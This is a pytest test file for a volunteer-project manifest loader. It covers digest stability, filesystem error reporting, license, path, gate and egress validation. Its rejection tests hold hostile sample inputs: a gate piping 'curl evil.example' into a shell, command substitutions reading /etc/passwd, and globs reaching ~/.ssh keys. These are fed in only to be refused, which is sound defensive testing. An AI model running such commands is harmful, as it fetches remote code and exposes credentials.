"""The volunteer manifest is a project's declared policy and its trust anchor.

Each test is named for the property it protects rather than the function it
calls, because the interesting failures here are not "the loader crashed" --
they are "a submission verified against a policy nobody declared".

The digest tests carry most of the weight.  A receipt bundle attests
``manifest_sha256``; if that value can be made to match while the effective
policy differs, every downstream verification is theatre.
"""

from __future__ import annotations

import errno
import json
import os
import re
import socket
import warnings
from contextlib import closing
from pathlib import Path
from typing import Any

import pytest

from bernstein.core.volunteer.manifest import (
    _KNOWN_FIELDS,
    OSI_APPROVED_LICENSES,
    VOLUNTEER_MANIFEST_PATH,
    GateCommand,
    UnenforcedManifestFieldWarning,
    VolunteerManifestError,
    _not_a_regular_file,
    canonical_manifest_bytes,
    load_manifest,
    load_manifest_from_repo,
)

VALID: dict[str, Any] = {
    "version": 1,
    "license": "Apache-2.0",
    "gates": [["uv", "run", "pytest", "-q"], ["uv", "run", "ruff", "check", "."]],
    "allowed_paths": ["src/**", "tests/**"],
    "egress_allowlist": ["pypi.org"],
    "sandbox": "microvm",
    "max_wall_clock_minutes": 30,
    "task_label": "volunteer-ok",
    "local_ok": True,
}


def _manifest(**overrides: Any) -> str:
    """A valid manifest document with fields replaced or removed.

    Passing ``None`` deletes the key, so a test can assert on a *missing*
    field as distinctly as on a malformed one.
    """
    payload = dict(VALID)
    for key, value in overrides.items():
        if value is None:
            payload.pop(key, None)
        else:
            payload[key] = value
    return json.dumps(payload)


def _load(**overrides: Any) -> Any:
    return load_manifest(_manifest(**overrides))


# ---------------------------------------------------------------------------
# Round trip
# ---------------------------------------------------------------------------


def test_valid_manifest_loads_every_declared_field() -> None:
    manifest = _load()

    assert manifest.version == 1
    assert manifest.license == "Apache-2.0"
    assert manifest.gates == (
        GateCommand(argv=("uv", "run", "pytest", "-q")),
        GateCommand(argv=("uv", "run", "ruff", "check", ".")),
    )
    assert manifest.allowed_paths == ("src/**", "tests/**")
    assert manifest.egress_allowlist == ("pypi.org",)
    assert manifest.sandbox == "microvm"
    assert manifest.max_wall_clock_minutes == 30
    assert manifest.task_label == "volunteer-ok"
    assert manifest.local_ok is True
    assert manifest.extensions == {}


def test_optional_fields_take_documented_defaults() -> None:
    """A minimal manifest is still a complete policy, not a partial one."""
    manifest = _load(allowed_paths=None, egress_allowlist=None, task_label=None, local_ok=None)

    assert manifest.allowed_paths == ()
    assert manifest.egress_allowlist == ()
    assert manifest.task_label == "volunteer-ok"
    assert manifest.local_ok is False


def test_reserialising_a_loaded_manifest_reproduces_its_digest() -> None:
    """Load → serialise → load is a fixed point, so a digest survives a hop."""
    original = _load()

    reloaded = load_manifest(canonical_manifest_bytes(original))

    assert reloaded == original
    assert reloaded.digest == original.digest


def test_manifest_loads_from_the_repository_path(tmp_path: Any) -> None:
    (tmp_path / ".bernstein").mkdir()
    (tmp_path / VOLUNTEER_MANIFEST_PATH).write_text(_manifest(), encoding="utf-8")

    assert load_manifest_from_repo(tmp_path).digest == _load().digest


def test_absent_manifest_is_not_opted_in_rather_than_invalid(tmp_path: Any) -> None:
    """A project that never opted in must not read as a project that failed."""
    with pytest.raises(FileNotFoundError):
        load_manifest_from_repo(tmp_path)


# ---------------------------------------------------------------------------
# Absent is not the same as unstattable (#4064)
#
# ``Path.is_file()`` answered one ``False`` for five different filesystem
# states, so the loader told a maintainer whose manifest is a broken symlink
# that their project had not opted in -- exit 1, well-formed, and false in the
# field a caller routes on.  ``FileNotFoundError`` is now reserved for the one
# state that claim is true of; everything else is an ``OSError`` the CLI
# already renders as ``<unreadable>``.
# ---------------------------------------------------------------------------


def _manifest_dir(root: Path) -> Path:
    directory = root / ".bernstein"
    directory.mkdir(exist_ok=True)
    return directory


def _shape(root: Path, kind: str) -> None:
    """Put `kind` at the manifest path, for the states a stat can end in."""
    path = _manifest_dir(root) / "volunteer.json"
    if kind == "symlink loop":
        path.symlink_to("volunteer.json")
    elif kind == "dangling symlink":
        path.symlink_to("no-such-file.json")
    elif kind == "directory":
        path.mkdir()
    elif kind == "fifo":
        os.mkfifo(path)
    elif kind == "socket":
        # Bind from inside the directory, by bare name. `sun_path` is 104 bytes
        # on macOS and 108 on Linux, and pytest's `tmp_path` under
        # /var/folders/<...>/pytest-of-<user>/pytest-N/<test-name>N/ already
        # spends most of that before ".bernstein/volunteer.json" is appended --
        # so binding the absolute path raises "AF_UNIX path too long" on macOS
        # while passing on CI. A relative bind is the same socket at the same
        # place and does not depend on how deep the tmpdir happens to be.
        previous = Path.cwd()
        os.chdir(path.parent)
        try:
            with closing(socket.socket(socket.AF_UNIX)) as sock:
                sock.bind(path.name)
        finally:
            os.chdir(previous)
    elif kind == "device":
        path.symlink_to("/dev/null")
    else:  # pragma: no cover - a typo in a parametrisation, not a state
        raise AssertionError(kind)


@pytest.mark.parametrize(
    "kind",
    ["symlink loop", "dangling symlink", "directory", "fifo", "socket", "device"],
)
def test_something_at_the_manifest_path_is_never_reported_as_not_opted_in(tmp_path: Path, kind: str) -> None:
    """Every state below is a manifest that exists and cannot be read.

    The assertion that matters is the negative one.  ``FileNotFoundError`` is
    an ``OSError``, so a clause catching the base class would pass a weaker
    test while the CLI still printed "the project has not opted in" -- that
    message is chosen by the *type*, not by the text.
    """
    _shape(tmp_path, kind)

    with pytest.raises(OSError) as caught:
        load_manifest_from_repo(tmp_path)

    assert not isinstance(caught.value, FileNotFoundError)
    assert "opted in" not in str(caught.value)


@pytest.mark.parametrize(
    ("kind", "expected"),
    [
        ("directory", "it is a directory, not a regular file"),
        ("fifo", "it is a fifo, not a regular file"),
        ("socket", "it is a socket, not a regular file"),
        ("device", "it is a device file, not a regular file"),
        ("dangling symlink", "the symbolic link has no target"),
    ],
)
def test_the_refusal_names_the_shape_that_was_found(tmp_path: Path, kind: str, expected: str) -> None:
    """A refusal without a reason sends the reader back to guessing.

    The CLI prints ``exc.strerror``, so these phrases are the whole of what a
    maintainer sees; they have to name the shape rather than restate the path,
    which the report already carries as its own key.
    """
    _shape(tmp_path, kind)

    with pytest.raises(OSError) as caught:
        load_manifest_from_repo(tmp_path)

    assert caught.value.strerror == expected


def test_a_fifo_is_refused_before_the_open_rather_than_after(tmp_path: Path) -> None:
    """Reaching ``read_bytes()`` on a fifo blocks until somebody writes to it.

    ``is_file()`` happened to prevent that by answering ``False``; the stat
    that replaced it has to keep the property deliberately.  This test hanging
    rather than failing is the symptom.
    """
    _shape(tmp_path, "fifo")

    with pytest.raises(OSError, match="not a regular file"):
        load_manifest_from_repo(tmp_path)


def test_a_manifest_that_cannot_be_stat_ed_keeps_the_reason_from_the_kernel(tmp_path: Path) -> None:
    """A permission failure must not be relabelled as a broken link.

    The ``ENOENT`` arm exists to separate "nothing there" from "symlink with no
    target".  Widening its ``except`` to ``OSError`` would route every stat
    failure through it, and ``lstat`` succeeds on a mode-000 file, so the
    refusal would come back naming a symlink that is not there.
    """
    path = _manifest_dir(tmp_path) / "volunteer.json"
    path.write_text(_manifest(), encoding="utf-8")
    path.chmod(0o000)
    try:
        path.read_bytes()
    except OSError:
        pass
    else:  # pragma: no cover - depends on the runner's privileges
        pytest.skip("this process can read a mode-000 file")
    finally:
        path.chmod(0o600)

    path.chmod(0o000)
    try:
        with pytest.raises(PermissionError) as caught:
            load_manifest_from_repo(tmp_path)
    finally:
        path.chmod(0o600)

    assert caught.value.strerror == "Permission denied"


def test_an_entry_that_disappears_mid_check_is_absent_rather_than_a_broken_link(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``stat`` and ``lstat`` are two syscalls and a file can vanish between them.

    Neither call is wrong when that happens, and the answer is the honest one:
    nothing is at the path now.  Without the second ``FileNotFoundError`` arm
    the race would be reported as a symlink whose target is missing.
    """
    (tmp_path / VOLUNTEER_MANIFEST_PATH).parent.mkdir(parents=True)
    (tmp_path / VOLUNTEER_MANIFEST_PATH).write_text(_manifest(), encoding="utf-8")

    def _vanished(self: Path, *args: Any, **kwargs: Any) -> Any:
        raise FileNotFoundError(errno.ENOENT, "No such file or directory", str(self))

    monkeypatch.setattr(Path, "stat", _vanished)
    monkeypatch.setattr(Path, "lstat", _vanished)

    with pytest.raises(FileNotFoundError, match="opted in"):
        load_manifest_from_repo(tmp_path)


def test_only_a_missing_entry_ends_the_ambiguity_as_an_absence(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The inner ``except`` is ``FileNotFoundError`` for a reason, not for symmetry.

    An ``lstat`` that fails some other way has not established that the path is
    empty, so it must propagate.  Widened to ``OSError`` this reads a failure
    it cannot interpret as proof the project never opted in -- the same
    substitution the whole change exists to undo, one level down.
    """
    (tmp_path / VOLUNTEER_MANIFEST_PATH).parent.mkdir(parents=True)

    def _gone(self: Path, *args: Any, **kwargs: Any) -> Any:
        raise FileNotFoundError(errno.ENOENT, "No such file or directory", str(self))

    def _refused(self: Path, *args: Any, **kwargs: Any) -> Any:
        raise PermissionError(errno.EACCES, "Permission denied", str(self))

    monkeypatch.setattr(Path, "stat", _gone)
    monkeypatch.setattr(Path, "lstat", _refused)

    with pytest.raises(PermissionError):
        load_manifest_from_repo(tmp_path)


def test_a_shape_this_platform_has_no_name_for_still_gets_a_message() -> None:
    """The fallback arm is portability, not decoration.

    Linux exhausts the file types above it, so nothing a stat returns here
    reaches this line -- but ``S_IFMT`` is not a closed set across platforms
    (Solaris doors, BSD whiteouts), and the arm is what keeps such a mode from
    rendering as an empty phrase inside "it is , not a regular file".  Asserted
    against the helper directly, because the claim is about a total function
    rather than about anything this kernel can produce.
    """
    assert _not_a_regular_file(0) == "of an unrecognised type"


def test_bernstein_itself_being_a_file_is_unreadable_rather_than_absent(tmp_path: Path) -> None:
    """``ENOTDIR`` is in ``_IGNORED_ERRNOS`` too, so ``is_file()`` hid this one.

    A regular file named ``.bernstein`` is a plausible mistake and the kernel's
    own wording says exactly what went wrong.
    """
    (tmp_path / ".bernstein").write_text("not a directory", encoding="utf-8")

    with pytest.raises(NotADirectoryError) as caught:
        load_manifest_from_repo(tmp_path)

    assert not isinstance(caught.value, FileNotFoundError)
    assert caught.value.strerror == "Not a directory"


# ---------------------------------------------------------------------------
# The digest is the trust anchor
# ---------------------------------------------------------------------------


def test_digest_is_the_width_a_receipt_bundle_attests() -> None:
    """``manifest_sha256`` is a 64-char lowercase hex field; feed it one."""
    digest = _load().digest

    assert len(digest) == 64
    assert digest == digest.lower()
    assert set(digest) <= set("0123456789abcdef")


def test_reformatting_the_file_does_not_change_the_digest() -> None:
    """Whitespace and key order are not policy.

    If they were, every outstanding receipt would break the first time someone
    ran a JSON formatter over the manifest.
    """
    pretty = json.dumps(VALID, indent=4, sort_keys=False)
    shuffled = json.dumps(dict(reversed(list(VALID.items()))), separators=(",", ":"))

    assert load_manifest(pretty).digest == load_manifest(shuffled).digest


@pytest.mark.parametrize(
    ("field", "tightened"),
    [
        ("gates", [["uv", "run", "pytest", "-q"]]),
        ("allowed_paths", ["src/**"]),
        ("egress_allowlist", []),
        ("sandbox", "container"),
        ("max_wall_clock_minutes", 15),
        ("task_label", "help-wanted"),
        ("local_ok", False),
        ("status", "paused"),
    ],
)
def test_changing_any_policy_field_changes_the_digest(field: str, tightened: Any) -> None:
    """Every field is policy, so every field is in the anchor.

    A field that could change without moving the digest would be a field a
    volunteer could ignore while still producing a receipt that verifies.
    """
    assert _load(**{field: tightened}).digest != _load().digest


def test_unknown_field_cannot_be_dropped_from_the_digest() -> None:
    """The downgrade this design exists to refuse.

    A project adds a policy-tightening field.  A worker too old to enforce it
    must not produce a receipt whose digest matches the manifest as if the
    field were not there -- that would be a valid-looking attestation of
    compliance with a rule the worker never read.
    """
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UnenforcedManifestFieldWarning)
        with_field = load_manifest(_manifest(require_signed_commits=True))
        without_field = load_manifest(_manifest())

        assert with_field.digest != without_field.digest

        flipped = load_manifest(_manifest(require_signed_commits=False))
        assert flipped.digest != with_field.digest


def test_unknown_field_is_carried_verbatim_into_the_canonical_form() -> None:
    """Carrying is what makes two loader generations agree on a digest.

    A newer build reads ``require_signed_commits`` as a known field and
    serialises it at the top level; this build keeps it in ``extensions`` and
    serialises it to the same place.  Same policy, same bytes, same digest.
    """
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UnenforcedManifestFieldWarning)
        manifest = load_manifest(_manifest(require_signed_commits=True))

    assert manifest.extensions == {"require_signed_commits": True}
    assert json.loads(canonical_manifest_bytes(manifest))["require_signed_commits"] is True


def test_unknown_field_warns_that_this_build_does_not_enforce_it() -> None:
    """Tolerated is not the same as ignored, and the donor gets told which."""
    with pytest.warns(UnenforcedManifestFieldWarning, match="require_signed_commits"):
        load_manifest(_manifest(require_signed_commits=True))


def test_known_fields_alone_do_not_warn() -> None:
    with warnings.catch_warnings():
        warnings.simplefilter("error")
        load_manifest(_manifest())


# ---------------------------------------------------------------------------
# Status: pause/resume for a volunteer project
# ---------------------------------------------------------------------------


def test_a_paused_manifest_loads_and_validates() -> None:
    manifest = _load(status="paused")

    assert manifest.status == "paused"
    assert manifest.is_active is False


def test_an_active_manifest_loads_and_validates() -> None:
    manifest = _load(status="active")

    assert manifest.status == "active"
    assert manifest.is_active is True


def test_manifest_without_status_defaults_to_active() -> None:
    manifest = _load(status=None)

    assert manifest.status == "active"
    assert manifest.is_active is True


@pytest.mark.parametrize("status", ["vibes", "inactive", "ACTIVE", "", 42])
def test_an_invalid_status_value_is_refused(status: Any) -> None:
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(status=status)

    assert excinfo.value.field == "status"


# ---------------------------------------------------------------------------
# Open-source-only is machine-checked
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("license_id", ["Proprietary", "LicenseRef-Custom", "BUSL-1.1", "Commons-Clause", "apache-2.0"])
def test_license_outside_the_osi_set_is_refused(license_id: str) -> None:
    """Umbrella decision 1: the program runs on public, OSI-licensed code.

    ``apache-2.0`` is in the list on purpose -- SPDX identifiers are
    case-sensitive, and a near-miss must fail loudly rather than pass as the
    license it resembles.
    """
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(license=license_id)

    assert excinfo.value.field == "license"


@pytest.mark.parametrize("license_id", sorted(OSI_APPROVED_LICENSES))
def test_every_accepted_license_actually_loads(license_id: str) -> None:
    """The allowlist and the loader cannot drift apart."""
    assert _load(license=license_id).license == license_id


# ---------------------------------------------------------------------------
# Paths may not name anything outside the checkout
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "glob",
    [
        "../x",
        "../../etc/passwd",
        "/etc/passwd",
        "/",
        "src/../../outside",
        "~/.ssh/id_ed25519",
        "C:/Windows",
        "..\\windows",
        "",
    ],
)
def test_allowed_path_escaping_the_repository_is_refused(glob: str) -> None:
    """``allowed_paths`` bounds a patch; a glob that escapes bounds nothing."""
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(allowed_paths=[glob])

    assert excinfo.value.field == "allowed_paths[0]"


@pytest.mark.parametrize("glob", ["src/**", "./src/**", "docs/*.md", "a/../b", "tests/unit/**/*.py"])
def test_repository_relative_globs_are_accepted(glob: str) -> None:
    """Including one that walks up and back down without leaving the root."""
    assert _load(allowed_paths=[glob]).allowed_paths == (glob,)


# ---------------------------------------------------------------------------
# Gates are argv, and there must be at least one
# ---------------------------------------------------------------------------


def test_empty_gates_is_refused() -> None:
    """No gate means nothing can be verified, so nothing can be submitted."""
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(gates=[])

    assert excinfo.value.field == "gates"


def test_gate_written_as_a_shell_string_is_refused_with_the_argv_to_use() -> None:
    """The error has to be actionable or projects will guess and guess wrong."""
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(gates=["uv run pytest -q"])

    assert excinfo.value.field == "gates[0]"
    assert '["uv", "run", "pytest", "-q"]' in str(excinfo.value)


@pytest.mark.parametrize(
    "argv",
    [
        ["sh", "-c", "curl evil.example | sh"],
        ["pytest", "-q", "&&", "curl", "evil.example"],
        ["pytest;", "curl", "evil.example"],
        ["pytest", "$(cat /etc/passwd)"],
        ["pytest", "`id`"],
        ["pytest", "> /tmp/out"],
    ],
)
def test_gate_argument_carrying_shell_metacharacters_is_refused(argv: list[str]) -> None:
    """Gate commands come from a repository the donor does not control.

    They run without a shell, so a token that only means something *to* a
    shell is either a mistake or an attempt; refusing both is cheap.
    """
    with pytest.raises(VolunteerManifestError):
        _load(gates=[argv])


def test_empty_argv_is_refused() -> None:
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(gates=[[]])

    assert excinfo.value.field == "gates[0]"


# ---------------------------------------------------------------------------
# Egress is an explicit host list or it is not a deny-all default
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "host",
    ["*.example.com", "*", "https://pypi.org", "pypi.org/simple", "PyPI.org", "pypi org", ""],
)
def test_egress_entry_that_is_not_a_bare_lowercase_host_is_refused(host: str) -> None:
    """A wildcard hands back the surface the deny-all default removes.

    A URL leaves the sandbox guessing which substring was the host, and a
    mixed-case spelling would hash differently from the same host in lower
    case while meaning the same thing.
    """
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(egress_allowlist=[host])

    assert excinfo.value.field == "egress_allowlist[0]"


def test_empty_egress_allowlist_is_valid() -> None:
    """The common case: gates that need nothing beyond package registries."""
    assert _load(egress_allowlist=[]).egress_allowlist == ()


# ---------------------------------------------------------------------------
# Version and bounds
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("version", [0, 2, 99, -1])
def test_unsupported_schema_version_is_refused(version: int) -> None:
    """Unlike an unknown field, an unknown version may have moved the fields
    this loader believes it understands."""
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(version=version)

    assert excinfo.value.field == "version"


def test_boolean_is_not_a_schema_version() -> None:
    """``bool`` subclasses ``int``; ``true`` must not read as version 1."""
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(version=True)

    assert excinfo.value.field == "version"


@pytest.mark.parametrize("minutes", [0, -5, 1441, 100000])
def test_wall_clock_outside_the_accepted_range_is_refused(minutes: int) -> None:
    """No project gets to ask for more than a day of a donor's machine."""
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(max_wall_clock_minutes=minutes)

    assert excinfo.value.field == "max_wall_clock_minutes"


@pytest.mark.parametrize("level", ["none", "chroot", "MICROVM", "docker"])
def test_unknown_sandbox_level_is_refused(level: str) -> None:
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(sandbox=level)

    assert excinfo.value.field == "sandbox"


# ---------------------------------------------------------------------------
# All-or-nothing parse
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("document", "expected_field"),
    [
        ("{not json", "<document>"),
        ("[]", "<document>"),
        ('"a string"', "<document>"),
        ("null", "<document>"),
        ("{}", "version"),
    ],
)
def test_malformed_document_names_the_field_at_fault(document: str, expected_field: str) -> None:
    with pytest.raises(VolunteerManifestError) as excinfo:
        load_manifest(document)

    assert excinfo.value.field == expected_field


@pytest.mark.parametrize("field", ["license", "gates", "sandbox", "max_wall_clock_minutes"])
def test_every_required_field_is_required(field: str) -> None:
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(**{field: None})

    assert excinfo.value.field == field


def test_a_failed_load_produces_no_object_at_all() -> None:
    """Half a policy is more dangerous than none.

    The failure is on the last field, so a loader that built up state as it
    went would have a manifest with valid gates and no valid sandbox -- and
    the sandbox is the containment boundary.
    """
    with pytest.raises(VolunteerManifestError) as excinfo:
        _load(sandbox="none")

    assert excinfo.value.field == "sandbox"
    assert not hasattr(excinfo.value, "manifest")


# ---------------------------------------------------------------------------
# The published schema is the loader's schema
# ---------------------------------------------------------------------------

_DOC = Path(__file__).resolve().parents[3] / "docs" / "reference" / "volunteer-manifest.md"


def _published_schema() -> dict[str, Any]:
    """The JSON Schema fenced in the reference page.

    Parsed rather than eyeballed, so the two tests below fail on drift instead
    of a reader discovering it.
    """
    blocks = re.findall(r"```json\n(.*?)```", _DOC.read_text(encoding="utf-8"), re.DOTALL)
    for block in blocks:
        candidate = json.loads(block)
        if candidate.get("$schema"):
            return candidate  # type: ignore[no-any-return]
    raise AssertionError(f"no JSON Schema block found in {_DOC}")


def test_published_schema_names_exactly_the_fields_the_loader_knows() -> None:
    """A documented field the loader ignores reads as enforced but is not.

    An enforced field the docs omit is worse: a project cannot know the rule it
    is being held to.
    """
    assert set(_published_schema()["properties"]) == _KNOWN_FIELDS


def test_published_schema_marks_exactly_the_fields_the_loader_requires() -> None:
    documented_required = set(_published_schema()["required"])
    actually_required = {field for field in _KNOWN_FIELDS if _raises_required_for(field)}

    assert documented_required == actually_required


def _raises_required_for(field: str) -> bool:
    """Whether omitting ``field`` is refused rather than defaulted."""
    try:
        _load(**{field: None})
    except VolunteerManifestError:
        return True
    return False


def test_published_example_is_a_manifest_that_loads() -> None:
    """The copy-paste starting point has to survive being copy-pasted."""
    blocks = re.findall(r"```json\n(.*?)```", _DOC.read_text(encoding="utf-8"), re.DOTALL)
    examples = [block for block in blocks if not json.loads(block).get("$schema")]

    assert examples, "the reference page shows no example manifest"
    for example in examples:
        assert load_manifest(example).digest
